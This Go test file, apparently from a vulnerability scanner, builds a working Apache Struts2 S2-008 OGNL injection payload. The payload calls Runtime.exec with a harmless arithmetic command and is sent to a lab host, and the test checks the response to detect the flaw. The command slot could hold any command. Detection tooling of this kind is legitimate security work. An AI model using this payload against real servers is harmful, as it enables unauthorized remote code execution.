package test

import (
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"net/url"
	"strconv"
	"strings"
	"testing"
)

func TestS2008(t *testing.T) {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	cmd := "expr __rand_1__ * __rand_2__"
	cmd = strings.ReplaceAll(cmd, "__rand_1__", strconv.Itoa(rand1))
	cmd = strings.ReplaceAll(cmd, "__rand_2__", strconv.Itoa(rand2))
	cmd = url.QueryEscape(cmd)
	payload := "/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allow" +
		"StaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22fa" +
		"lse%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22" +
		"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtim" +
		"e@getRuntime%28%29.exec%28%27__cmd__%27%29.getInputStream%28%29%29)"
	payload = strings.ReplaceAll(payload, "__cmd__", cmd)
	output := tool.FormatPayload(payload)
	log.Info("payload: %s", output)
	req := &http.Request{
		Url:    http.NewUrl("http://192.168.222.132:8080" + payload),
		Method: "POST",
	}
	resp := http.DoRequest(req)
	if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) {
		log.Info("find S2-008")
	}
}
